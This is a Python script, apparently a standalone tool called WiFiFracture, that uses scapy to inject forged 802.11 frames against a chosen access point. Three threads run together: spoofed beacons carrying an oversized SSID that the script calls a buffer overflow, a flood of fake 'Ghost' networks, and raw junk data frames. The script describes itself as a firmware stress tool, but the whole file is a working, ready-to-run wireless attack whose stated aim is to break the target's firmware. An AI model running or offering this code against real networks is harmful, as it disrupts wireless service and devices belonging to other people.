import argparse
import threading
import time
import re
import os
import sys
from scapy.all import RadioTap, Dot11, Dot11Elt, Raw, sendp

class WiFiFracture:
    def __init__(self, bssid, duration, interface):
        if not re.match(r"^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$", bssid):
            raise ValueError("Invalid BSSID format. Use XX:XX:XX:XX:XX:XX")
        self.bssid = bssid
        self.duration = duration
        self.interface = interface
        self.running = True

    def attack_buffer_overflow(self):
        """Method 1: Memory Overflow (Sending an oversized SSID)"""
        print(f"🚀 [Overflow] Sending massive SSID...")
        huge_ssid = "A" * 255
        while self.running:
            try:
                packet = RadioTap() / \
                        Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=self.bssid) / \
                        Dot11Elt(ID='SSID', info=huge_ssid.encode())
                sendp(packet, iface=self.interface, verbose=False)
                time.sleep(0.1)
            except Exception as e:
                print(f"⚠️ [Overflow] Error: {e}")
                break

    def attack_beacon_flood(self):
        """Method 2: Beacon Flood (Creating many 'Ghost' networks)"""
        print(f"🚀 [Beacon] Creating ghost networks...")
        while self.running:
            try:
                new_ssid = f"Ghost-{time.strftime('%H%M%S')}"
                packet = RadioTap() / \
                        Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=self.bssid) / \
                        Dot11Elt(ID='SSID', info=new_ssid.encode())
                sendp(packet, iface=self.interface, verbose=False)
                time.sleep(0.1)
            except Exception as e:
                print(f"⚠️ [Beacon] Error: {e}")
                break

    def attack_binary_chaos(self):
        """Method 3: Binary Chaos (Injecting raw data into Data frames)"""
        print(f"🚀 [Chaos] Injecting binary chaos...")
        chaos_data = bytes([i % 255 for i in range(100)])
        while self.running:
            try:
                packet = RadioTap() / \
                        Dot11(type=2, subtype=0, addr1="ff:ff:ff:ff:ff:ff", addr2=self.bssid) / \
                        Raw(load=chaos_data)
                sendp(packet, iface=self.interface, verbose=False)
                time.sleep(0.1)
            except Exception as e:
                print(f"⚠️ [Chaos] Error: {e}")
                break

    def start_attack(self):
        print(f"🎯 Starting attack on {self.bssid} via {self.interface} for {self.duration}s...")
        threads = [
            threading.Thread(target=self.attack_buffer_overflow, daemon=True),
            threading.Thread(target=self.attack_beacon_flood, daemon=True),
            threading.Thread(target=self.attack_binary_chaos, daemon=True)
        ]
        for t in threads:
            t.start()

        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print("\n🛑 User interrupted the attack.")
        finally:
            self.running = False
            print(f"\n✅ Attack complete! Check the target firmware status.")

def main():
    if os.geteuid() != 0:
        print("❌ Error: This script requires root privileges. Use 'sudo'.")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="Multi-layer Wi-Fi Firmware Stress Tool")
    parser.add_argument("--bssid", type=str, required=True, help="Target BSSID (e.g., 00:1A:2B:3C:4D:5E)")
    parser.add_argument("--d", type=int, default=60, help="Duration in seconds (default: 60)")
    parser.add_argument("--wlan", type=str, required=True, help="Wi-Fi Interface (e.g., wlan0mon)")
    args = parser.parse_args()

    if not os.path.exists(f"/sys/class/net/{args.wlan}"):
        print(f"❌ Error: Interface {args.wlan} does not exist.")
        sys.exit(1)

    try:
        tool = WiFiFracture(bssid=args.bssid, duration=args.d, interface=args.wlan)
        tool.start_attack()
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()